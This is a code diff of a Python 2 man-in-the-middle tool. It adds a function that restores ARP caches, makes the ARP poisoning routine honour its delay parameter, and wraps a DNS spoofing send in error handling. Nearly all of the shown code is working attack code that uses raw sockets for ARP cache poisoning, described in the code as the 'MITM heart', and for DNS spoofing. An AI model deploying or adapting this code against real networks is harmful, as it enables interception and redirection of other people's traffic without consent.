@@ -29,7 +29,21 @@ from threading import Thread
 from socket import *
 from utils import *
 
-def poison(dev, source_mac, source, target, delay = 5):
+def rearp(dev, source, target):
+	""" reset arp cache of the target and the router (AP) """
+	target_mac = get_mac_byip(target)
+	source_mac = get_mac_byip(source)
+	sock = socket(PF_PACKET, SOCK_RAW)
+	sock.bind((dev, dpkt.ethernet.ETH_TYPE_ARP))
+	for i in xrange(6):
+		try:
+			sock.send(str(build_arp_packet(target_mac, source, target)))
+			sock.send(str(build_arp_packet(source_mac, target, source)))
+		except:
+			pass
+
+
+def poison(dev, source_mac, source, target, delay = 4):
 	"""
 	poison arp cache of target and router, causing all traffic between them to
 	pass inside our machine, MITM heart
@@ -44,7 +58,7 @@ def poison(dev, source_mac, source, target, delay = 5):
 			try:
 				sock.send(str(build_arp_packet(source_mac, source, target)))
 				sock.send(str(build_arp_packet(source_mac, target, source)))
-				time.sleep(5) # OS refresh ARP cache really often
+				time.sleep(delay) # OS refresh ARP cache really often
 			except:
 				pass
 	except KeyboardInterrupt:
@@ -266,7 +280,10 @@ def dns_spoof(dev, source_mac, source, target = None, host = None, redirection =
 				print inet_ntoa(ip.src)
 
 				buf = dnet.ip_checksum(str(ip))
-				sock.send(buf)
+				try:
+					sock.send(buf)
+				except:
+					pass
 
 		except KeyboardInterrupt:
 			print '[+] DNS spoofing interrupted\n\r'
